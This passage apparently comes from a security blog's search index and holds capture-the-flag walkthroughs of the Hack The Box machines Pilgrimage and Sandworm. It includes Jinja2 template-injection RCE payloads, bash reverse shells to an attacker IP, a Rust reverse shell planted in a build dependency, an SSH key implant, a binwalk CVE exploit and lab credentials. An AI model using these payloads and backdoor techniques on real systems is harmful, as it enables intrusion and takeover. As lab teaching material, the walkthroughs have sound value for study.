emily, root, and www-data are the only important users on the box. emily cannot sudo at all. emily has a hidden directory /home/emily/.config/binwalk. That&rsquo;s very odd: binwalk is an application usually used in forensics stuff. The box has nc, netcat, wget, curl, python, perl and php all available. Next I took a look at pspy to see what was running. Nothing super interesting was happening. The system did some kind of malware scan using /usr/sbin/malwarescan.sh and was waiting with /usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/. Both of these were running as root.
However, as soon as I tried uploading an image to the website, a whole series of processes occurred:
Cool to see that the system is indeed just using convert, like I predicted earlier.
Why is root running binwalk when a file is submitted? Is this related to the malware scan? It&rsquo;s running binwalk with the --extract flag, to automatically extract known filetypes from an image file. And how does this all interact with the /home/emily/.config/binwalk directory found earlier?
It makes sense to start out with that config folder, and see what&rsquo;s inside. I checked all subdirectories at once:
ls -laR /home/emily/.config/binwalk This revealed two empty files:
/home/emily/.config/binwalk/config/extract.conf /home/emily/.config/binwalk/magic/binarch Brief History of Binwalk I did some searching online about these two files. I couldn&rsquo;t find anything about binarch, but it turns out that extract.conf controls how binwalk behaves with the -e --extract flag. Although this file is currently empty, if it has valid entries inside, it instructs binwalk which known file types should be extracted out of the the images when binwalk is ran.
Second, I checked the currently installed version of binwalk. It is running version 2.3.2. Cross-referencing this with the current version on Github, apparently this is an old version, and may be subject to a vulnerability:
*** Extraction Security Notice *** Prior to Binwalk v2.3.3, extracted archives could create symlinks which point anywhere on the file system, potentially resulting in a directory traversal attack if subsequent extraction utilties blindly follow these symlinks. More generically, Binwalk makes use of many third-party extraction utilties which may have unpatched security issues; Binwalk v2.3.3 and later allows external extraction tools to be run as an unprivileged user using the run-as command line option (this requires Binwalk itself to be run with root privileges). Additionally, Binwalk v2.3.3 and later will refuse to perform extraction as root unless --run-as=root is specified.
Oh interesting indeed. The fact that emily controls the extract.conf file and the box is running a version prior to 2.3.3 definitely seems like something that can be used for privilege escalation. This all makes me think of a &ldquo;zip slip&rdquo; attack, but in reverse. The vulnerability that the above notice is referring to is CVE-2022-4510, and can be found referenced in the Binwalk Issues.
While that Issue thread on the github repo does have PoC code, and does already have a bundled zip file containing the PoC, the code isn&rsquo;t very&hellip; weaponizable. I tried changing out a few things, such as changing the print statement to a simple file write - nothing seemed to work.
A little more reading online about Binwalk showed what might be expected in that extract.conf file. Apparently, it can be used to run certain plugins based on what filetype is detected when the -e flag is used. I tried writing a new rule into extract.conf as shown below:
Then, I used the website to upload a .jpg image, meanwhile watching pspy for the result. Unfortunately, binwalk didn&rsquo;t even run!
This got me wondering, what exactly is triggering binwalk to run? I saw all that output in pspy earlier, but I wonder what the specific series of calls is. I checked pspy a little closer to find an answer to this, and immediately had my answer - much higher/earlier in the process history:
From the man pages:
inotifywait efficiently waits for changes to files using Linux&rsquo;s inotify(7) interface. It is suitable for waiting for changes to files from shell scripts. It can either exit once an event occurs, or continually execute and output events as they occur.
Now I understand. The system is watching that one directory for changes. That must be what is triggering binwalk to run.
RCE using Binwalk As a quick search to make sure I wasn&rsquo;t going in the wrong direction, I checked searchsploit to see if there was already exploit code for CVE-2022-4510. It turns out it does exist:
I copied the exploit over to my working folder, quickly read through the script manually, then tried running it:
I set a new firewall rule and established a netcat listener.:
sudo ufw allow from 10.10.11.219 to any port 4444 proto tcp bash nc -lvnp 4444 Then, I ran the exploit (or rather, exploit-generator) code, supplying it with a PNG file I had around, my tun0 IP address, and my nc listener&rsquo;s port:
It produced a new file, binwalk_exploit.png.
I tried once to submit this binwalk_exploit.png through the website (while watching pspy), but didn&rsquo;t notice any unusual response to that input file. I assumed that the exploit had somehow been broken by the convert / resize operation, and opted for a more direct approach.
This time, I&rsquo;ll try depositing the file directly into /var/www/pilgrimage.htb/shrunk/ and wait for inotify to notice the change to the directory. It worked like a charm, immediately opening a reverse shell for root:
🎉 Wondrous! The warm fuzzies of a root shell &#x1f917;
From there, simply cat out the root flag to finish the box:
cat /root/root.txt LESSONS LEARNED Attacker Enumerate for hidden directories, too. Finding the .git repo in this box was extremely valuable. If you ever find a git repo, use a tool like GitHacker or GitDumper right away and save yourself some time. To expedite discovering a .git discloser, consider getting the DotGit browser extension. Start broad, then sink your teeth in: I&rsquo;m glad I didn&rsquo;t spend too long attempting to sneak a payload into an image to upload to the website - ultimately this would not have worked (or not worked easily), due to the &ldquo;malware scan&rdquo; that we used for privesc. There&rsquo;s a good chance somebody has already written a tool to solve XYZ. For example, I didn&rsquo;t need to write any python to decode the sqlite database, I probably could have just popped the hex directly into CyberChef and finished much faster. Read pspy carefully, and remember it is not a linear history of events: it is a log of processes spawning other processes and may not be in chronological order. Critical thinking is your best tool for deciphering it. Defender Read the news. If you see that a serious vulnerability affects something that one of your systems uses, be sure to patch it as soon as possible. Avoid using libraries that are infamous. ImageMagik had several very serious vulnerabilities (collectively called ImageTragik), dating back to 2017. I only discovered the new file-disclosure CVE because I had knew at the back of my mind about ImageTragik and decided to check for insecure file upload vulnrabilities that might be related to it. Use Docker. This would have been a much more difficult box if the webserver, the image resizing functionality, and the database were all separate containers. It probably would have been an easier system to develop, too. Least privilege should always be applied. There was no good reason that Binwalk was running as root. `,url:"https://4wayhandshake.github.io/walkthrough/pilgrimage/"},"https://4wayhandshake.github.io/walkthrough/sandworm/":{title:"Sandworm",tags:["PGP","SSTI","User Pivot","Plaintext Credentials","Credential Re-use","Rust","Malicious Dependency","Scheduled Process","Firejail"],categories:["Walkthrough","HTB","Linux","Medium"],content:`INTRODUCTION At the time of writing this walkthrough, this is still an Active box. It was released as the very first box for HTB&rsquo;s Hackers Clash: Open Beta Season II. The box is hosting a webserver for a &ldquo;Secret Spy Agency&rdquo;. They seem to concern themselves with gathering intelligence from other agencies, but the website is mostly a tip-line: users can privately submit tips to SSA using their contact form and PGP key. The best part is, they even have a page that instructs you on proper usage of PGP &#x1f609;
RECON For this box, I&rsquo;m running a slightly different enumeration strategy. I set up a directory for the box, with a nmap subdirectory. Then set $RADDR to my target machine&rsquo;s IP, and scanned it with a simple but broad port scan:
sudo nmap -p- -O --min-rate 5000 -oN nmap/port-scan.txt $RADDR The results showed only ports 22 (SSH), 80 (HTTP), and 443 (SSL - for HTTPS):
Nmap scan report for 10.129.234.27 Host is up (0.17s latency). Not shown: 65423 closed tcp ports (reset), 109 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 443/tcp open https I followed up with a more detailed script scan that would include the above ports:
nmap -sV -sC -n -Pn --top-ports 2000 -oN nmap/init-scan.txt $RADDR The results show that port 80 is just to redirect to port 443:
Not shown: 1997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA) |_ 256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to https://ssa.htb/ 443/tcp open ssl/http nginx 1.18.0 (Ubuntu) |_http-title: Secret Spy Agency | Secret Security Service | ssl-cert: Subject: commonName=SSA/organizationName=Secret Spy Agency/stateOrProvinceName=Classified/countryName=SA | Not valid before: 2023-05-04T18:03:25 |_Not valid after: 2050-09-19T18:03:25 |_http-server-header: nginx/1.18.0 (Ubuntu) You may note that, throughout this walkthrough I have a different IP address for the target in a few locations: I was having connection issues with HTB on a few occasions and had to reconnect and refresh the box.
Webserver Strategy Did banner-grabbing, noticed redirect to SSL at https://ssa.htb. Also, server is using nginx on Ubuntu:
DOMAIN=&#34;ssa.htb&#34; whatweb https://$DOMAIN &amp;&amp; curl -IL https://$DOMAIN Added ssa.htb to /etc/hosts and proceeded with vhost enumeration, subdomain enumeration, and directory enumeration.
echo &#34;10.129.234.27 ssa.htb&#34; | sudo tee -a /etc/hosts ☝️ I use tee instead of the append operator &gt;&gt; so that I don&rsquo;t accidentally blow away my /etc/hosts file with a typo of &gt; when I meant to write &gt;&gt;.
I performed vhost and subdomain enumeration:
WLIST=&#34;/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt&#34; ffuf -w $WLIST -u https://$RADDR/ -H &#34;Host: FUZZ.ssa.htb&#34; -c -t 60 -o fuzzing/vhost.md -of md -timeout 4 -ic -ac ffuf -w $WLIST -u https://FUZZ.ssa.htb/ -c -t 60 -o fuzzing/subdomain.md -of md -timeout 4 -ic -ac No results from vhost or subdomain enumeration, so I proceeded with directory enumeration on https://ssa.htb:
WLIST=&#34;/usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt&#34; feroxbuster -w $WLIST -u https://ssa.htb -A -d 1 -t 100 -T 4 -f --auto-tune --collect-words --filter-status 400,401,402,403,404,405 --output fuzzing/directory.json --insecure ☝️ You must use the --insecure flag to connect using https to a host that&rsquo;s providing a self-signed SS certificate.
Directory enumeration gave the following:
Exploring the Website I took a look through the website, then navigated to the contact form which linked to the PGP guide: https://ssa.htb/guide.
Noticing from the page footer that the server uses Flask (a Python webserver) and that it&rsquo;s showing dynamic content to the screen, it is probably server-side rendered. I tried all SSTIs I knew on the &ldquo;Decrypt Message&rdquo; form on /guide. No success. Tried an SSTI polyglot. Also tried Tplmap - still no success.
The &ldquo;Encrypt Message&rdquo; form doesn&rsquo;t seem to work? I&rsquo;ll put in a valid key, but don&rsquo;t get any output in the righthand side box.
Tried the &ldquo;Verifying Signed Messages&rdquo; part from the bottom of the page: copied the message into a text file on my machine and did signature verification. All worked as expected. Then, I tried the &ldquo;Key verification&rdquo; part:
Received output in a modal:
Signature is valid! [GNUPG:] NEWSIG gpg: Signature made Tue 20 Jun 2023 07:30:32 PM UTC gpg: using RSA key 6C1B861B051BCBE1BF509EB37242284A00767F85 [GNUPG:] KEY_CONSIDERED 6C1B861B051BCBE1BF509EB37242284A00767F85 0 [GNUPG:] SIG_ID UXJ+d8D6wC4vz7mB2FGQK+ejonA 2023-06-20 1687289432 [GNUPG:] KEY_CONSIDERED 6C1B861B051BCBE1BF509EB37242284A00767F85 0 [GNUPG:] GOODSIG 7242284A00767F85 fourwayhandshake gpg: Good signature from &#34;fourwayhandshake &#34; [unknown] [GNUPG:] VALIDSIG 6C1B861B051BCBE1BF509EB37242284A00767F85 2023-06-20 1687289432 0 4 0 1 10 00 6C1B861B051BCBE1BF509EB37242284A00767F85 [GNUPG:] TRUST_UNDEFINED 0 pgp gpg: WARNING: This key is not certified with a trusted signature! gpg: There is no indication that the signature belongs to the owner. Primary key fingerprint: 6C1B 861B 051B CBE1 BF50 9EB3 7242 284A 0076 7F85 &#x1f4a1; There&rsquo;s something interesting: it spits out my name. Maybe I can make a name that also has a shell command. I should investigate command injection using the name on the key&hellip;
Result was this:
Signature is valid! [GNUPG:] NEWSIG gpg: Signature made Tue 20 Jun 2023 07:58:02 PM UTC gpg: using RSA key 962789BE402C6FA7180AC086F148DB99FC2C0964 [GNUPG:] KEY_CONSIDERED 962789BE402C6FA7180AC086F148DB99FC2C0964 0 [GNUPG:] SIG_ID ifdPnAG5/2de9CusW9edo+9HmzI 2023-06-20 1687291082 [GNUPG:] KEY_CONSIDERED 962789BE402C6FA7180AC086F148DB99FC2C0964 0 [GNUPG:] GOODSIG F148DB99FC2C0964 id;id&amp;&amp;id;$(id)&amp;&amp;\`id\` gpg: Good signature from &#34;id;id&amp;&amp;id;$(id)&amp;&amp;\`id\` &#34; [unknown] [GNUPG:] VALIDSIG 962789BE402C6FA7180AC086F148DB99FC2C0964 2023-06-20 1687291082 0 4 0 1 10 00 962789BE402C6FA7180AC086F148DB99FC2C0964 [GNUPG:] TRUST_UNDEFINED 0 pgp gpg: WARNING: This key is not certified with a trusted signature! gpg: There is no indication that the signature belongs to the owner. Primary key fingerprint: 9627 89BE 402C 6FA7 180A C086 F148 DB99 FC2C 0964 Drats. Nothing. I&rsquo;ll try spewing some template injections in there instead.
gpg --gen-key Then used the following name:
\${7*7} {{7*7}} {{7*&#39;7&#39;}} {{7*&#34;7&#34;}} #{7*7} a{*comment*}b \${&#34;z&#34;.join(&#34;ab&#34;)} &#34;&#34;&#34; Then show the newly generated ID and save the key to a file:
gpg --list-public-keys gpg --output mykey2.gpg --export --armor Sign a message, then cat out the public key and the signed message:
gpg --armor --default-key 14E14BFF231B35A25C4AD0A901E0C72283D85AF6 --sign message1.txt cat mykey2.gpg &amp;&amp; cat message1.txt.asc The result was the following:
There we go! Some success there. These three portions of the name all got parsed:
{{7*7}} {{7*&#39;7&#39;}} {{7*&#34;7&#34;}} So, according to the SSTI test payload chart from PayloadAllTheThings, we must be dealing with a Jinja2 or Twig template. Since the server is using Flask (it says so in the footer), it must be Jinja2.
Before I proceed, I&rsquo;ll set a new firewall rule and start a netcat listener:
sudo ufw allow from 10.129.234.27 to any port 4444 proto tcp bash nc -lvnp 4444 However, I&rsquo;ll try a simpler command before I go for a reverse shell. This is probably the most basic RCE you can do with Jinja2 SSTI:
{{ self.__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;id&#39;).read() }} Using the above as the name on the key, this is the result I got from the server:
Excellent! Not only did we get a username, it looks like probably a regular/human user (usually the case when uid &gt;= 1000).
I was getting a little tired of re-entering the same sequence of gpg commands over and over, and it was really starting to clutter up my keyring, so I wrote the process into a python script. You can grab a copy from my github repo.
Next, let&rsquo;s dump /etc/pass, and while we&rsquo;re at it, try using base-64 encoding for the payload:
echo Y2F0IC9ldGMvcGFzc3dk | base64 --decode | bash -i The response:
Next, let&rsquo;s try a reverse shell:
echo -n &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.15/4444 0&gt;&amp;1&#39; | base64 Hmm no luck.
At this point, even copy-pasting all this stuff was getting tedious, so I took the script Jinja2_SSTI_RCE.py from my git repo and ran the payloads through python Requests, then added a little bit of code to parse the output.
The result is a very rudimentary shell that works specifically for HTB Sandworm. Clone the script here if you want to try it out.
Next attempt at a reverse shell:
bash -c &#34;bash -i &gt;&amp; /dev/tcp/10.10.14.15/4444 0&gt;&amp;1&#34; Oh?! That actually worked! Excellent &#x1f601;
USER FLAG web app source code &#x1f632; Normally I&rsquo;d upgrade my shell right away, but this time I&rsquo;m too eager to take a look around. Running an active, competitive box like this is unexpectedly motivating.
The reverse shell landed us in /var/www/html/SSA which has a subdirectory (also called SSA) for the Flask app. Taking a peek into app.py reveals a few things. Firstly, we can now see how the contact form works:
@main.route(&#34;/contact&#34;, methods=(&#39;GET&#39;, &#39;POST&#39;,)) def contact(): if request.method == &#39;GET&#39;: return render_template(&#34;contact.html&#34;, name=&#34;contact&#34;) tip = request.form[&#39;encrypted_text&#39;] if not validate(tip): return render_template(&#34;contact.html&#34;, error_msg=&#34;Message is not PGP-encrypted.&#34;) msg = gpg.decrypt(tip, passphrase=&#39;$M1DGu4rD$&#39;) if msg.data == b&#39;&#39;: msg = &#39;Message was encrypted with an unknown PGP key.&#39; else: tip = msg.data.decode(&#39;utf-8&#39;) msg = &#34;Thank you for your submission.&#34; save(tip, request.environ.get(&#39;HTTP_X_REAL_IP&#39;, request.remote_addr)) return render_template(&#34;contact.html&#34;, error_msg=msg) Note that they have the gpg passphrase in plaintext: $M1DGu4rD$. We also know from this line exactly where the corresponding key (or keyring) should be:
gpg = gnupg.GPG(gnupghome=&#39;/home/atlas/.gnupg&#39;, options=[&#39;--ignore-time-conflict&#39;]) The import lines also show that there is some database config in an adjacent file.
Also, it shows that there are a number of endpoints that didn&rsquo;t show up in my directory enumeration:
/admin /view /login /logout &#x1f914; Why weren&rsquo;t these found during directory enumeration? I&rsquo;ll have to look into that later.
To take a look at the database definition, we should look inside __init__.py:
from flask import Flask from flask_login import LoginManager from flask_sqlalchemy import SQLAlchemy db = SQLAlchemy() def create_app(): app = Flask(__name__) app.config[&#39;SECRET_KEY&#39;] = &#39;91668c1bc67132e3dcfb5b1a3e0c5c21&#39; app.config[&#39;SQLALCHEMY_DATABASE_URI&#39;] = &#39;mysql://atlas:GarlicAndOnionZ42@127.0.0.1:3306/SSA&#39; db.init_app(app) # blueprint for non-auth parts of app from .app import main as main_blueprint app.register_blueprint(main_blueprint) login_manager = LoginManager() login_manager.login_view = &#34;main.login&#34; login_manager.init_app(app) from .models import User @login_manager.user_loader def load_user(user_id): return User.query.get(int(user_id)) return app And there&rsquo;s a MySQL credential! atlas : GarlicAndOnionZ42
atlas That&rsquo;s some solid info. Next I&rsquo;ll check atlas&rsquo;s home directory to see if there are any ways to get a better shell. Sure would be nice if I could just implant an SSH key or something. Checking out their home directory:
drwxr-xr-x 8 atlas atlas 4096 Jun 7 13:44 . drwxr-xr-x 4 nobody nogroup 4096 May 4 15:19 .. lrwxrwxrwx 1 nobody nogroup 9 Nov 22 2022 .bash_history -&gt; /dev/null -rw-r--r-- 1 atlas atlas 220 Nov 22 2022 .bash_logout -rw-r--r-- 1 atlas atlas 3771 Nov 22 2022 .bashrc drwxrwxr-x 2 atlas atlas 4096 Jun 6 08:49 .cache drwxrwxr-x 3 atlas atlas 4096 Feb 7 10:30 .cargo drwxrwxr-x 4 atlas atlas 4096 Jan 15 07:48 .config drwx------ 4 atlas atlas 4096 Jun 21 10:01 .gnupg drwxrwxr-x 6 atlas atlas 4096 Feb 6 10:33 .local -rw-r--r-- 1 atlas atlas 807 Nov 22 2022 .profile drwx------ 2 atlas atlas 4096 Feb 6 10:34 .ssh .cargo didn&rsquo;t seem too interesting, but .config looked juicy. I took a look at what was inside:
ls -laR ~/.config This reveals a directory for a program called firejail (more on that later) and for httpie. httpie has only a single subdirectory sessions/localhost_5000 that houses one file, admin.json. What&rsquo;s this admin.json file? Contents:
{ &#34;__meta__&#34;: { &#34;about&#34;: &#34;HTTPie session file&#34;, &#34;help&#34;: &#34;https://httpie.io/docs#sessions&#34;, &#34;httpie&#34;: &#34;2.6.0&#34; }, &#34;auth&#34;: { &#34;password&#34;: &#34;quietLiketheWind22&#34;, &#34;type&#34;: null, &#34;username&#34;: &#34;silentobserver&#34; }, &#34;cookies&#34;: { &#34;session&#34;: { &#34;expires&#34;: null, &#34;path&#34;: &#34;/&#34;, &#34;secure&#34;: false, &#34;value&#34;: &#34;eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkludmFsaWQgY3JlZGVudGlhbHMuIl19XX0.Y-I86w.JbELpZIwyATpR58qg1MGJsd6FkA&#34; } }, &#34;headers&#34;: { &#34;Accept&#34;: &#34;application/json, */*;q=0.5&#34; } } Very interesting &#x1f4a1; If I recall correctly, I saw silentobserver was one of the users on the box. Solid bet that this credential is reused: silentobserver : quietLiketheWind22
Nice! Gut instinct was correct: the credential was re-used for SSH!
This lands us in /home/silentobserver. The user flag is right there, just cat it:
cat user.txt ROOT FLAG silentobserver Unlike with atlas, I think it&rsquo;s actually a good idea to enumerate silentobserver thoroughly. Having SSH makes this substantially easier. I&rsquo;ll follow my typical User Enumeration (Linux) procedure. So as not to clutter up this walkthrough with unnecessary details, I&rsquo;ll just show the notable results of enumeration below:
silentobserver can&rsquo;t sudo anything
Too bad, because otherwise PATH abuse would be an easy privilege escalation:
PATH=/home/silentobserver/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin silentobserver has nc, netcat, curl, wget, perl and tmux available.
Netstat reveals MySQL, a MySQL interface, and another server on tcp port 5000 : Found some strange scheduled processes happening, using pspy: Also found in pspy, but ps aux shows an interesting program that I haven&rsquo;t seen before: I had to look it up, but apparently this
MySQL Just to be thorough, let&rsquo;s check out the MySQL database. I&rsquo;ll try the credential obtained earlier, from the Flask app&rsquo;s __init__.py.
No problem there. What&rsquo;s inside?
mysql&gt; show databases; +--------------------+ | Database | +--------------------+ | SSA | | information_schema | | performance_schema | +--------------------+ 3 rows in set (0.00 sec) mysql&gt; use SSA; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed mysql&gt; show tables; +---------------+ | Tables_in_SSA | +---------------+ | users | +---------------+ 1 row in set (0.00 sec) mysql&gt; describe users; +----------+--------------+------+-----+---------+----------------+ | Field | Type | Null | Key | Default | Extra | +----------+--------------+------+-----+---------+----------------+ | id | int | NO | PRI | NULL | auto_increment | | username | varchar(255) | NO | | NULL | | | password | varchar(255) | NO | | NULL | | +----------+--------------+------+-----+---------+----------------+ 3 rows in set (0.00 sec) Checking the users table reveals two password hashes:
User Password Odin pbkdf2:sha256:260000$q0WZMG27Qb6XwVlZ$12154640f87817559bd450925ba3317f93914dc22e2204ac819b90d60018bc1f silentobserver pbkdf2:sha256:260000$kGd27QSYRsOtk7Zi$0f52e0aa1686387b54d9ea46b2ac97f9ed030c27aac4895bed89cb3a4e09482d &#x1f44a; Oof. Frankly I do not think I&rsquo;ll be able to crack that. That is the proper way to store passwords&hellip; I&rsquo;ll switch back to examining those strange processes from pspy.
Cleaning up Crates Below is an excerpt from running pspy. What is this cleanup routine even doing? Why run crates offline? What could be the point of that? This is just too weird to ignore. This must be the privesc. For reference, this sequence of processes seems to be repeating once per minute:
I&rsquo;ll take a look at this /opt/tipnet stuff and see if I can figure out what it&rsquo;s doing. First file I checked was /opt/tipnet/access.log. It&rsquo;s full of messages like this:
And inside /opt/tipnet/src/main.rs there is a database credential:
It seems like there are two important directories at play here:/opt/tipnet and /opt/crates/logger. The pspy output (shown above) gives hints as to how the two are related. There is an even better hint inside /opt/tipnet/Cargo.toml:
Oh, now I see. Logger is a dependency to tipnet. So the system is performing a fresh build of the logger source code every two minutes, this code gets integrated into tipnet, then the system sets the suid bit on tipnet and runs tipnet as atlas (using cargo run --offline). The system also sends the character &rsquo;e&rsquo; to tipnet.
Interestingly, the current user silentobserver has group permissions to write to the only source file within logger:
First, let&rsquo;s take a look at what logger actually does:
Ok, this is starting to make a bit of sense. It seems like the box is nudging us towards doing some more as atlas instead of silentobserver. After all, the previous reverse shell as atlas was very limited: we couldn&rsquo;t even write files to the home directory. Since tipnet is being executed with sudo -u atlas, modifying tipnet could yield a new reverse shell.
On top of that, we already know a good method for modifying tipnet: by modifying the source code of one of its dependencies. We&rsquo;ll just have to wait (up to) two minutes for the scheduled process to re-build the source code and run it.
This is the current source code of lib.rs, the file that silentobserver has write access to:
It&rsquo;s very simple. In short, it writes a single formatted line into the file /opt/tipnet/access.log. We know that this function is indeed getting called, because we&rsquo;ve already seen recent timestamps within access.log. So, let&rsquo;s just mash a Rust reverse shell into the log function:
use std::net::TcpStream; use std::os::unix::io::{AsRawFd, FromRawFd}; use std::process::{Command, Stdio}; ... let s = TcpStream::connect(&#34;10.10.14.15:4321&#34;).unwrap(); let fd = s.as_raw_fd(); Command::new(&#34;/bin/sh&#34;) .arg(&#34;-i&#34;) .stdin(unsafe { Stdio::from_raw_fd(fd) }) .stdout(unsafe { Stdio::from_raw_fd(fd) }) .stderr(unsafe { Stdio::from_raw_fd(fd) }) .spawn() .unwrap() .wait() .unwrap(); The result is the following code, a version of lib.rs that has a reverse shell at the end of the function. I&rsquo;ll call this file revshell.rs:
extern crate chrono; use std::fs::OpenOptions; use std::io::Write; use chrono::prelude::*; use std::net::TcpStream; use std::os::unix::io::{AsRawFd, FromRawFd}; use std::process::{Command, Stdio}; pub fn log(user: &amp;str, query: &amp;str, justification: &amp;str) { let now = Local::now(); let timestamp = now.format(&#34;%Y-%m-%d %H:%M:%S&#34;).to_string(); let log_message = format!(&#34;[{}] - User: {}, Query: {}, Justification: {}\\n&#34;, timestamp, user, query, justification); let mut file = match OpenOptions::new().append(true).create(true).open(&#34;/opt/tipnet/access.log&#34;) { Ok(file) =&gt; file, Err(e) =&gt; { println!(&#34;Error opening log file: {}&#34;, e); return; } }; if let Err(e) = file.write_all(log_message.as_bytes()) { println!(&#34;Error writing to log file: {}&#34;, e); } // Add reverse shell logic here let s = TcpStream::connect(&#34;10.10.14.15:4321&#34;).unwrap(); let fd = s.as_raw_fd(); Command::new(&#34;/bin/sh&#34;) .arg(&#34;-i&#34;) .stdin(unsafe { Stdio::from_raw_fd(fd) }) .stdout(unsafe { Stdio::from_raw_fd(fd) }) .stderr(unsafe { Stdio::from_raw_fd(fd) }) .spawn() .unwrap() .wait() .unwrap(); } As silentobserver, we can overwrite the existing lib.rs with the contents of this file and the rust compiler shouldn&rsquo;t notice.
Next, I&rsquo;ll set up a reverse shell listener on my attacker box then as silentobserver I&rsquo;ll backup the old file, and overwrite it with the modified one:
sudo ufw allow from 10.10.11.218 to any port 4321 proto tcp bash nc -lvnp 4321 cp /opt/crates/logger/src/lib.rs /tmp/lib.rs cp /tmp/revshell.rs /opt/crates/logger/src/lib.rs After waiting for a about a minute for the new build of tipnet and for the scheduled process to run it, I caught a reverse shell:
Interestingly, atlas is now in an additional group, 1002(jailer).
atlas Clearly there is something different about atlas than the last time we were logged in as them. I&rsquo;ll enumerate this user and see what they can do. First though, I&rsquo;ll upgrade the reverse shell:
python3 -c &#34;import pty; pty.spawn(&#39;/bin/bash&#39;)&#34; [ctrl+z] stty raw -echo fg [enter] [enter] export TERM=xterm256-color To look into atlas, I&rsquo;ll follow my typical strategy User Enumeration (Linux). To spare you all the fluffy procedural details, I&rsquo;ll only show the notable results of enumeration here:
atlas has write access to their home directory. That&rsquo;s new.
jailer has access to firejail
atlas@sandworm:/opt/tipnet$ find / -group jailer 2&gt;/dev/null /usr/local/bin/firejail firejail is one of the suid binaries on the system, and can be accessed by group jailer!: jailer First of all, we just found out that we can write to /home/atlas now, and that includes their .ssh directory. So instead of working from a reverse shell, let&rsquo;s implant an SSH key for a more comfortable connection. Create a key and base-64 encode it:
ssh-keygen [used &#39;password&#39; as the passphrase] cat id_rsa.pub | base64 -w 0 Copy the output to the clipboard. Then, using the new atlas reverse shell, implant the key:
echo -n &#34;c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCQVFDbEVpRUdjcEJsbUZSQTRIejFyMVdPZUNIaWtJZzdaZTFTU3hDKzloK3pWQzcydVRpRFlaOWVQbEdVRzRGajU3bkphM25SSC9QakNFQkRPZjZEaEZsb2s5cXpwdXlZanRxZmpvM3lEOHd2Um5yVjBvb2JDMWJZbldyYUpweXZCZUtMUnh4azdhNmEyNXdlaGlFR0FKS0dIQ0JtS2xsNzNUNGZpQStoSFVpSWlzLzk1cC9LUUp1b0hmUlpqb3RnUGdYZXdKYVp6d0wrT2NBVlYrbmVxTG95Y3dmSWxLNUlIZ1B4MlNJSXV2OElJaEdDYUdpM0J0MG5UOTVmOHQ0QTRpblFWek5nNmVoWEI3MGtPSWZBemZsWUh4anUvcllKNGVIdXhKU0pvZ294QkcrTWFlQXdqcVBSdnVxaFp1K2pQL1A3ZlVNbTR4WG5IN0pSZFB0Nm1kWmgga2FsaUBrYWxpCg==&#34; | base64 --decode &gt; ~/.ssh/authorized_keys And check your work with cat ~/.ssh/authorized_keys. Then go ahead and log in from the attacker machine, as atlas, using SSH:
I&rsquo;m not personally familiar with firejail. From a bit of searching I&rsquo;ve found that most people use it for sandboxing a web browser; on this box, it&rsquo;s used to sandbox a Flask app. It looks like you can run other programs through it, but the SUID bit does not seem to affect the result. To try this out, I wrote a tiny shell script:
#!/bin/bash echo &#34;$(id)&#34; &gt; /home/atlas/test.txt cat /root/root.txt &gt;&gt; /home/atlas/test.txt Then ran it through firejail. The result inside test.txt was showed that it was still run under the unprivileged atlas user:
atlas@sandworm:~$ cat test.txt uid=1000(atlas) gid=1000(atlas) groups=1000(atlas) Since I&rsquo;m out of obvious ideas, I&rsquo;ll search the internet to see if there are any exploits for firejail. I searched for &ldquo;firejail SUID privilege escalation exploit&rdquo;. The first few search results showed that this has indeed been a popular idea, and explored by many people.
A little further down the results I found a gist that was a copy of this code. To try it out, I saved it into a python file on my attacker machine and served it to atlas user, using a python3 http.server.
Running the exploit on the target machine, as atlas shows some instructions:
In another terminal? No problem: we have access to tmux on this machine.
I did ctrl+C to kill the process and entered exit to revert to the regular atlas user (Just like when I ran test.sh before, this exploit seems to leave the user as the unprivileged atlas without the jailer group.)
There we go! That&rsquo;s a root, folks! &#x1f389;
Simply cat out the flag and finish the box:
cat /root/root.txt LESSONS LEARNED Attacker Be methodical: if you&rsquo;re going to try something like an SSTI, try it on every possible input. The best strategy is to figure out an easy test-case and to apply it to every place that might be vulnerable, knowing clearly what both a positive and negative outcome should look like. For this box, I used the popular &ldquo;7*7&rdquo; tests for SSTIs. To limit the scope of what to check for finding the initial exploit, always enumerate the box as much as you can. Know the component technologies and their versions. For web, I often turn to Wappalyzer. &ldquo;If I had eight hours to chop down a tree, I&rsquo;d spend the first six of them sharpening my axe&rdquo; (Abraham Lincoln) After recognizing that this SSTI scenario was quite unusual, I wrote my own tool for RCE. It was a big time-saver to realize early that the combination SSTI + Jinja2 + RCE + PGP was pretty niche, and it might be fastest just to whip out some python &#x1f40d; Keep two lists going: credentials, and services that require logins. Any time you write down a new entry for either list, check for any untried credential-service combinations. Credential re-use is very common, and it&rsquo;s easy to accidentally work too hard if you don&rsquo;t realize you&rsquo;ve already found the correct login for the next step of the box. If you encounter a language you don&rsquo;t know, spend a few minutes and learn to write a hello-world. Better yet, scrap together a reverse shell or webshell. It&rsquo;s true, I really do not enjoy Rust - I don&rsquo;t see why anyone does. But unfortunately, it was a huge asset for this box. Try to think in terms of information flows. Recognizing that I could change tipnet binary because is used a dependency that I could affect (lib.rs) was very important. There is not always a clear hierarchy of privilege ex. &ldquo;X is lowest privilege, Y has more than X, then root has more than Y&rdquo;. What matters most is what the current objective is, and which user could be used to achieve that goal. Defender Be sure to properly escape all user input for a website. As far as I&rsquo;ve seen, SSTIs are always avoidable. Hardcoded connection strings for databases can be problematic. One way to have handled this better would have been to run the MySQL database as a docker container, as a separate user. Any time that you&rsquo;re being tempted to store a password in plaintext, especially inside source 